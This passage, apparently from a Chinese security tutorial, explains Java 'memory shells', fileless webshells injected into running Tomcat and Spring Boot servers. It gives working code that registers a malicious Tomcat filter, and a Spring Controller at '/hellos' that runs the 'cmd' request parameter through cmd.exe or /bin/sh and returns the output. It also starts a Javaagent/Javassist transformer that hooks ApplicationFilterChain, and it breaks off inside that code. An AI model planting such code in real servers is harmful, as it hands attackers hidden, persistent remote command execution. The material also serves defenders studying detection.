            };
            //创建对应的FilterDef
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            /**
             * 将filterDef添加到filterDefs中
             */
            standardContext.addFilterDef(filterDef);
            //创建对应的FilterMap，并将其放在最前
            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/Filtershell");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMapBefore(filterMap);
            //调用反射方法，去创建filterConfig实例
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
            //将filterConfig存入filterConfigs，等待filterchain.dofilter的调用
            filterConfigs.put(name, filterConfig);
            out.print("Inject Success !");
        }
    %>
        filtershell
**动态注册Listener**
  * 1、首先通过反射，从request中获取Tomcat中控制Web应用的Context（StandardContext对象）
  * 2、创建一个ServletRequestListener对象并重写其requestDestroyed方法，在其中实现命令执行并通过response回显.
  * 3、将创建的ServletRequestListener对象通过StandardContext添加到事件监听中去
### 2）、基于动态添加框架组件的内存马实现
这里说到的框架有很多，spring、springboot、weblogic等
这边主要说下springboot框架的组件内存马的实现：动态注册Controller来实现内存马：
springboot在处理请求的时候的主要逻辑是再Controller中进行的，所以我们可以代码层次注册一个Controller来实现内存马：
动态注册一个Controller主要思路：
  * 1、从springboot中获取上下文context
  * 2、定义好要注入Controller的路径以及处理请求使用的逻辑（方法），这里具体实现是使用一个恶意类Eval.class，通过反射获取其实现的一个恶意方法。
  * 3、利用mappingHandlerMapping.registerMapping（）方法将其注入到处理中去
下面通过一个spring boot2.52版本的的项目测试，添加一个Controller，通过注解类完成路径是 **/noshell**
，在其中完成我们动态注册一个新的Controller来实现内存马的目的：
    package com.example.myspring.controller;
    import org.springframework.stereotype.Controller;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.ResponseBody;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.context.request.ServletRequestAttributes;
    import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
    import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
    import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
    import java.lang.reflect.Method;
    @Controller
    public class NoshellController {
        @ResponseBody
        @RequestMapping("/noshells")
        public void noshell(HttpServletRequest request, HttpServletResponse response) throws Exception {
            // 获取Context
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
                    currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            // 通过反射获得恶意类的test方法
            Method method = Evil.class.getMethod("test");
            // 定义该controller的path
            PatternsRequestCondition url = new PatternsRequestCondition("/hellos");
            // 定义允许访问的HTTP方法
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            // 构造注册信息
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
    //        RequestMappingInfo info = RequestMappingInfo.paths(String.valueOf(url))
    //                .methods(ms)
    //                .options(null)
    //                .build();
            // 创建用于处理请求的对象，避免无限循环使用一个构造方法
            Evil injectToController = new Evil("xxx");
            // 将该controller注册到Spring容器
            mappingHandlerMapping.registerMapping(info, injectToController, method);
            System.out.println("测试xxxxxx");
            response.getWriter().println("inject success");
        }
        public class Evil {
            public Evil(String xxx) {
            }
            public void test() throws Exception {
                HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
                HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
    // 获取cmd参数并执行命令
                String command = request.getParameter("cmd");
                if (command != null) {
                    try {
                        java.io.PrintWriter printWriter = response.getWriter();
                        String o = "";
                        ProcessBuilder p;
                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                            p = new ProcessBuilder(new String[]{"cmd.exe", "/c", command});
                        } else {
                            p = new ProcessBuilder(new String[]{"/bin/sh", "-c", command});
                        }
                        java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                        o = c.hasNext() ? c.next() : o;
                        c.close();
                        printWriter.write(o);
                        printWriter.flush();
                        printWriter.close();
                    } catch (Exception ignored) {
                    }
                }
            }
        }
    }
上面代码的实现的时候要注意一个问题，测试使用的spring
boot要用2.6以下的，2.6以后RequestMappingInfo的初始化构造发生了一些变化，否则会导致失败
运行该项目测试：
访问/noshells，来运行我们添加内存马的代码：
最后访问注册的新的Controller 路径为/hellos，并传入参数cmd来执行命令：
可以看到内粗马以实现，具体场景的使用我们可以将其转换成jsp，或者转换成一个恶意类，通过反序列等造成任意代码执行的sink点来发起利用从而实现内存马。
### 3）、基于Javaagent和Javassist技术的内存马实现
##### 原理
试想如果我们能找到一些关键类，这些关键类是Tomcat或相关容器处理请求的必经类，也就是要掉用相关类的相关方法，就可以完全摆脱url的限制，那么我们再通过javaagent和javassist实现运行时动态修改字节码来完成类的修改和重载，从中修改某方法的实现逻辑，嵌入命令执行并且回显，那么是不是同样可以实现内存马呢！
首先我们要找到Tomcat中请求处理的必经类也就是通用类。如：上文提到过Tomcat中的WEB组件Filter的实现，是一个Filterchain的链式调用，对请求做层层过滤：上一个filter调用该链的下一个filter的时候是通过filterchain.doFilter方法实现的：
跟进是调用一个实现FilterChain接口的ApplicationFilterChain类的doFilter方式，其实现如下，正常情况下其实现是由InternalDoFilter（）实现的，并传入其request
and response对象。
所以我们要找的通用类，必经方法可以是ApplicationFilterChain类的internalDoFilter（request，response）方法：
##### 实现
**Agent:**
定义Agentthing类并定义agentmain(String,Instrumentation)方法，再方法中调用Instrumentation的addTransformer方法添加自定义的转换方法。检测jvm加载类，当匹配到了我们要找的ApplicationFilterChain（org.apache.catalina.core.ApplicationFilterChain）类，调用retransformClasses方法转换或者调用redefineClasses方法重载，这个两种方法都能实现字节码的修改，但后续针对这两种实现方式的修复和检测上存在很大的不同；上面讲javaagent技术的时候我们使用的是redefineclasses来实现的，这里我们实现的时候使用retransformClasses；
    package priv.ga0weI.baseonagent;
    import java.lang.instrument.Instrumentation;
    import java.lang.instrument.UnmodifiableClassException;
    public class Agentthing {
        public  static  void  agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
            Transformerthings tf = new Transformerthings();//new my transformer
            inst.addTransformer(tf,true);//added
            Class[] allclass = inst.getAllLoadedClasses();//get all class load by ...
            for (Class cl : allclass){
                if (cl.getName().equals("org.apache.catalina.core.ApplicationFilterChain"))//for Tomcat
                {
                    inst.retransformClasses(cl);
                }
            }
        }
    }
**转换类：**
定义Agent中使用到的Transformerthings类，该类实现ClassFileTransformer接口并重写其抽象方法transform，在该方法中实现使用javassist来修改其对应类的字节码实现，也就是插入我们准备好的cmd命令执行并回显code
    package priv.ga0weI.baseonagent;
    import javassist.*;
    import java.io.*;
    import java.lang.instrument.ClassFileTransformer;
    import java.lang.instrument.IllegalClassFormatException;
    import java.security.ProtectionDomain;
    public class Transformerthings implements ClassFileTransformer {
        @Override
        public byte[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
            if (className.equals("org/apache/catalina/core/ApplicationFilterChain")){ // class from in jvm named as xxx/xxx/xxx/xxx
                try {
    //                System.out.println("a request com and hook the ApplicationFilterChain");
                    ClassPool classPool = ClassPool.getDefault();